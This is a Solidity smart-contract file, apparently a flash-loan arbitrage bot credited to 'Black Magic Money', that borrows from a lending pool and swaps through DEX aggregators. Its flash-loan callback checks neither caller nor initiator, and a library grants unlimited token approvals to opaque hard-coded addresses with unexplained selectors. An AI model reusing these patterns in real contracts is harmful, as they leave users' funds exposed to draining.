/*
    ¥=========================================================================================================€
    $| ███╗██████╗  ██╗    ██╗  ██╗      ███╗   ███╗ ██████╗ ██╗  ██╗     ███╗   ███╗███╗   ██╗██╗   ██╗███╗ |$
    
    $| ██║  ██████╔╝██║     █████╔╝█████╗██╔████╔██║██║  ███╗█████╔╝█████╗██╔████╔██║██╔██╗ ██║ ╚████╔╝  ██║ |$
    $| ██║  ██╔══██╗██║     ██╔═██╗╚════╝██║╚██╔╝██║██║   ██║██╔═██╗╚════╝██║╚██╔╝██║██║╚██╗██║  ╚██╔╝   ██║ |$
    
    $| ╚══╝╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══╝ |$
    $| ███╗██████╗  ██╗    ██╗  ██╗      ███╗   ███╗ ██████╗ ██╗  ██╗     ███╗   ███╗███╗   ██╗██╗   ██╗███╗ |$
    $| ██╔╝ ██╔══██╗██║     ██║ ██╔╝     ████╗ ████║██╔════╝ ██║ ██╔╝     ████╗ ████║████╗  ██║╚██╗ ██╔╝╚██║ |$
    $| ██║  ██████╔╝██║     █████╔╝█████╗██╔████╔██║██║  ███╗█████╔╝█████╗██╔████╔██║██╔██╗ ██║ ╚████╔╝  ██║ |$
    $| ██║  ██╔══██╗██║     ██╔═██╗╚════╝██║╚██╔╝██║██║   ██║██╔═██╗╚════╝██║╚██╔╝██║██║╚██╗██║  ╚██╔╝   ██║ |$
    $| ███╗██████╔╝███████╗██║  ██╗     ██║ ╚═╝ ██║╚██████╔╝██║  ██╗      ██║ ╚═╝ ██║██║ ╚████║   ██║   ███║ |$
    $| ╚══╝╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══╝ |$
    $| ███╗██████╗  ██╗    ██╗  ██╗      ███╗   ███╗ ██████╗ ██╗  ██╗     ███╗   ███╗███╗   ██╗██╗   ██╗███╗ |$
    
    $| ██║  ██████╔╝██║     █████╔╝█████╗██╔████╔██║██║  ███╗█████╔╝█████╗██╔████╔██║██╔██╗ ██║ ╚████╔╝  ██║ |$

    $| ███╗██████╔╝███████╗██║  ██╗     ██║ ╚═╝ ██║╚██████╔╝██║  ██╗      ██║ ╚═╝ ██║██║ ╚████║   ██║   ███║ |$
    $| ╚══╝╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══╝ |$
    €=========================================================================================================¥
    This code was produced by Black Magic Money.
*/
//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;
pragma experimental ABIEncoderV2;

library console {
    function toString(uint256 value) public pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function hexify(address addy) internal pure returns (string memory) {
        bytes memory buffer = abi.encodePacked(addy);
        // Fixed buffer size for hexadecimal convertion
        bytes memory converted = new bytes(buffer.length * 2);

        bytes memory _base = "0123456789abcdef";

        for (uint256 i = 0; i < buffer.length; i++) {
            converted[i * 2] = _base[uint8(buffer[i]) / _base.length];
            converted[i * 2 + 1] = _base[uint8(buffer[i]) % _base.length];
        }

        return string(abi.encodePacked("0x", converted));
    }

    function track(
        address base,
        address quote
    ) public pure returns (string memory) {
        return string(abi.encodePacked(hexify(base), " => ", hexify(quote)));
    }

    function concat(
        string calldata a,
        string calldata b
    ) public pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function concat(
        string calldata a,
        uint256 b
    ) public pure returns (string memory) {
        return string(abi.encodePacked(a, toString(b)));
    }

    function warn(
        bool condition,
        string calldata a,
        uint256 b,
        string calldata c,
        uint256 d,
        string calldata e,
        uint256 f
    ) public pure {
        require(
            condition,
            string(
                abi.encodePacked(a, toString(b), c, toString(d), e, toString(f))
            )
        );
    }

    function warn(
        bool condition,
        string calldata a,
        uint256 b,
        string calldata c,
        uint256 d
    ) public pure {
        require(
            condition,
            string(abi.encodePacked(a, toString(b), c, toString(d)))
        );
    }

    function warn(bool condition, string calldata a, uint256 b) public pure {
        require(condition, string(abi.encodePacked(a, toString(b))));
    }

    function decode(
        bytes memory _returnData
    ) internal pure returns (string memory) {
        assembly {
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string));
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

library Trader {
    function estimate(
        address tokenIn,
        address tokenOut,
        uint256 amountOut,
        uint256 amountInMax
    ) public returns (uint256) {
        bool success = false;
        bytes memory res;
        (success, res) = 0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F.call(
            abi.encodeWithSelector(
                0xe719283e,
                amountOut,
                tokenIn,
                tokenOut,
                amountInMax
            )
        );
        if (!success) {
            (success, res) = 0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F.call(
                abi.encodeWithSelector(
                    0xea270cba,
                    amountOut,
                    tokenIn,
                    tokenOut,
                    amountInMax
                )
            );
            if (!success) {
                (success, res) = 0x2A78c465F72387F175314DA5796D086683dEe3FF
                    .call(
                        abi.encodeWithSelector(
                            0xe719283e,
                            amountOut,
                            tokenIn,
                            tokenOut,
                            amountInMax
                        )
                    );
                if (!success) {
                    (success, res) = 0x2A78c465F72387F175314DA5796D086683dEe3FF
                        .call(
                            abi.encodeWithSelector(
                                0xea270cba,
                                amountOut,
                                tokenIn,
                                tokenOut,
                                amountInMax
                            )
                        );
                    if (!success) {
                        (
                            success,
                            res
                        ) = 0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0.call(
                            abi.encodeWithSelector(
                                0xe719283e,
                                amountOut,
                                tokenIn,
                                tokenOut,
                                amountInMax
                            )
                        );
                        if (!success) {
                            (
                                success,
                                res
                            ) = 0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0.call(
                                abi.encodeWithSelector(
                                    0xea270cba,
                                    amountOut,
                                    tokenIn,
                                    tokenOut,
                                    amountInMax
                                )
                            );
                            if (!success) {
                                (
                                    success,
                                    res
                                ) = 0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176
                                    .call(
                                        abi.encodeWithSelector(
                                            0xe719283e,
                                            amountOut,
                                            tokenIn,
                                            tokenOut,
                                            amountInMax
                                        )
                                    );
                                if (!success) {
                                    (
                                        success,
                                        res
                                    ) = 0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176
                                        .call(
                                            abi.encodeWithSelector(
                                                0xea270cba,
                                                amountOut,
                                                tokenIn,
                                                tokenOut,
                                                amountInMax
                                            )
                                        );
                                }
                            }
                        }
                    }
                }
            }
        }
        return abi.decode(res, (uint256));
    }

    function partialSwap(
        address tokenIn,
        address tokenOut,
        uint256 amount
    ) public {
        bool success;
        // amount = IERC20(tokenIn).balanceOf(address(this)) <= amount
        //     ? amount
        //     : IERC20(tokenIn).balanceOf(address(this));
        // (success, ) = 0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F.call(
        //     abi.encodeWithSelector(
        //         0x5a5b7990,
        //         amount,
        //         tokenIn,
        //         tokenOut,
        //         0,
        //         address(this),
        //         true
        //     )
        // );
        // if (!success) {
        //     (success, ) = 0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F.call(
        //         abi.encodeWithSelector(
        //             0x976c89bb,
        //             amount,
        //             tokenIn,
        //             tokenOut,
        //             0,
        //             address(this),
        //             true
        //         )
        //     );
        //     if (!success) {
        //         (success, ) = 0x2A78c465F72387F175314DA5796D086683dEe3FF.call(
        //             abi.encodeWithSelector(
        //                 0x5a5b7990,
        //                 amount,
        //                 tokenIn,
        //                 tokenOut,
        //                 0,
        //                 address(this),
        //                 true
        //             )
        //         );
        //         if (!success) {
        //             (success, ) = 0x2A78c465F72387F175314DA5796D086683dEe3FF
        //                 .call(
        //                     abi.encodeWithSelector(
        //                         0x976c89bb,
        //                         amount,
        //                         tokenIn,
        //                         tokenOut,
        //                         0,
        //                         address(this),
        //                         true
        //                     )
        //                 );
        //             if (!success) {
        (success, ) = 0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0.call(
            abi.encodeWithSelector(
                0x5a5b7990,
                amount,
                tokenIn,
                tokenOut,
                0,
                address(this),
                true
            )
        );
        if (!success) {
            (success, ) = 0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0.call(
                abi.encodeWithSelector(
                    0x976c89bb,
                    amount,
                    tokenIn,
                    tokenOut,
                    0,
                    address(this),
                    true
                )
            );
            if (!success) {
                (success, ) = 0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176.call(
                    abi.encodeWithSelector(
                        0x5a5b7990,
                        amount,
                        tokenIn,
                        tokenOut,
                        0,
                        address(this),
                        true
                    )
                );
                if (!success)
                    (success, ) = 0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176
                        .call(
                            abi.encodeWithSelector(
                                0x976c89bb,
                                amount,
                                tokenIn,
                                tokenOut,
                                0,
                                address(this),
                                true
                            )
                        );
            }
        }
        //             }
        //         }
        //     }
        // }
    }

    function segmentedSwap(
        address tokenIn,
        address tokenOut,
        uint256 cycles
    ) public {
        bool success;
        IERC20(tokenIn).approve(
            0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F,
            type(uint256).max
        );

        IERC20(tokenIn).approve(
            0x2A78c465F72387F175314DA5796D086683dEe3FF,
            type(uint256).max
        );

        IERC20(tokenIn).approve(
            0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0,
            type(uint256).max
        );

        IERC20(tokenIn).approve(
            0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176,
            type(uint256).max
        );
        uint256 amount = IERC20(tokenIn).balanceOf(address(this)) / cycles;
        for (uint256 i = 0; i < cycles; i++) {
            partialSwap(tokenIn, tokenOut, amount);
        }
    }

    function swap(address tokenIn, address tokenOut) public {
        bool success;
        uint256 amount = IERC20(tokenIn).balanceOf(address(this));
        IERC20(tokenIn).approve(
            0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F,
            type(uint256).max
        );
        (success, ) = 0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F.call(
            abi.encodeWithSelector(
                0x5a5b7990,
                amount,
                tokenIn,
                tokenOut,
                0,
                address(this),
                true
            )
        );
        if (!success)
            (success, ) = 0x305F9CA91a0c3a3ebAC190a00B91cBddC6B3624F.call(
                abi.encodeWithSelector(
                    0x976c89bb,
                    amount,
                    tokenIn,
                    tokenOut,
                    0,
                    address(this),
                    true
                )
            );
        if (!success) {
            IERC20(tokenIn).approve(
                0x2A78c465F72387F175314DA5796D086683dEe3FF,
                type(uint256).max
            );
            (success, ) = 0x2A78c465F72387F175314DA5796D086683dEe3FF.call(
                abi.encodeWithSelector(
                    0x5a5b7990,
                    amount,
                    tokenIn,
                    tokenOut,
                    0,
                    address(this),
                    true
                )
            );
            if (!success) {
                (success, ) = 0x2A78c465F72387F175314DA5796D086683dEe3FF.call(
                    abi.encodeWithSelector(
                        0x976c89bb,
                        amount,
                        tokenIn,
                        tokenOut,
                        0,
                        address(this),
                        true
                    )
                );
                if (!success) {
                    IERC20(tokenIn).approve(
                        0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0,
                        type(uint256).max
                    );
                    (success, ) = 0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0
                        .call(
                            abi.encodeWithSelector(
                                0x5a5b7990,
                                amount,
                                tokenIn,
                                tokenOut,
                                0,
                                address(this),
                                true
                            )
                        );
                    if (!success) {
                        (success, ) = 0x02c1a5A6f9cFF20FC1475A7d9E46EE877Bf8b1a0
                            .call(
                                abi.encodeWithSelector(
                                    0x976c89bb,
                                    amount,
                                    tokenIn,
                                    tokenOut,
                                    0,
                                    address(this),
                                    true
                                )
                            );
                        if (!success) {
                            IERC20(tokenIn).approve(
                                0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176,
                                type(uint256).max
                            );
                            (
                                success,

                            ) = 0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176.call(
                                abi.encodeWithSelector(
                                    0x5a5b7990,
                                    amount,
                                    tokenIn,
                                    tokenOut,
                                    0,
                                    address(this),
                                    true
                                )
                            );
                            if (!success)
                                (
                                    success,

                                ) = 0xad0488e529091A1c5F3DA7bFFdB94A72edbE6176
                                    .call(
                                        abi.encodeWithSelector(
                                            0x976c89bb,
                                            amount,
                                            tokenIn,
                                            tokenOut,
                                            0,
                                            address(this),
                                            true
                                        )
                                    );
                        }
                    }
                }
            }
        }
    }
}

interface IPoolAddressesProvider {
    function getPool() external view returns (address);
}

interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

library EnigmaV3 {
    address private constant Kyber = 0x6131B5fae19EA4f9D964eAc0408E4408b66337b5;
    address private constant Para = 0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57;
    address private constant Zero = 0xDEF189DeAEF76E379df891899eb5A00a94cBC250;

    address private constant ParaProxy =
        0x216B4B4Ba9F3e719726886d34a177484278Bfcae;

    function swap(
        uint256 provider,
        address tokenIn,
        bytes memory swapParams
    ) external returns (bool success, bytes memory error) {
        IERC20(tokenIn).approve(Kyber, type(uint256).max);
        if (provider == 0) (success, error) = Kyber.call(swapParams);
        else if (provider == 1) {
            IERC20(tokenIn).approve(Zero, type(uint256).max);
            (success, error) = Zero.call(swapParams);
        } else if (provider == 2) {
            IERC20(tokenIn).approve(Para, type(uint256).max);
            IERC20(tokenIn).approve(ParaProxy, type(uint256).max);
            (success, error) = Para.call(swapParams);
        } else revert("Provider Uknown");
        require(success, string(error));
    }
}

interface IWETH {
    function withdraw(uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);
}

contract Main {
    address public WETH = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address internal immutable pool =
        IPoolAddressesProvider(0xa97684ead0e402dC232d5A977953DF7ECBaB3CDb)
            .getPool();

    struct TradeDesc {
        uint providerID;
        address tokenIn;
        bytes data;
    }

    receive() external payable {}

    fallback() external payable {}

    function encode(
        TradeDesc calldata intro,
        TradeDesc calldata outro
    ) public pure returns (bytes memory encoded) {
        encoded = abi.encode(intro, outro);
    }

    function decode(
        bytes calldata encoded
    ) public pure returns (TradeDesc memory intro, TradeDesc memory outro) {
        (intro, outro) = abi.decode(encoded, (TradeDesc, TradeDesc));
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        (TradeDesc memory intro, TradeDesc memory outro) = decode(params);
        EnigmaV3.swap(intro.providerID, intro.tokenIn, intro.data);
        EnigmaV3.swap(outro.providerID, outro.tokenIn, outro.data);
        return IERC20(asset).approve(pool, type(uint256).max);
    }

    function send(
        address tokenA,
        address tokenB,
        uint256 loanAmount,
        TradeDesc calldata intro,
        TradeDesc calldata outro
    ) public returns (uint balance) {
        IPool(pool).flashLoanSimple(
            address(this),
            tokenA,
            loanAmount,
            encode(intro, outro),
            0
        ); // Initiates flashloan with swap data
        balance = IERC20(tokenB).balanceOf(address(this));
        IERC20(tokenB).transfer(msg.sender, balance); // Transfers unswapped to account
        balance = IERC20(tokenA).balanceOf(address(this));
        IERC20(tokenA).transfer(msg.sender, balance); // Transfers unswapped to account
    }
}
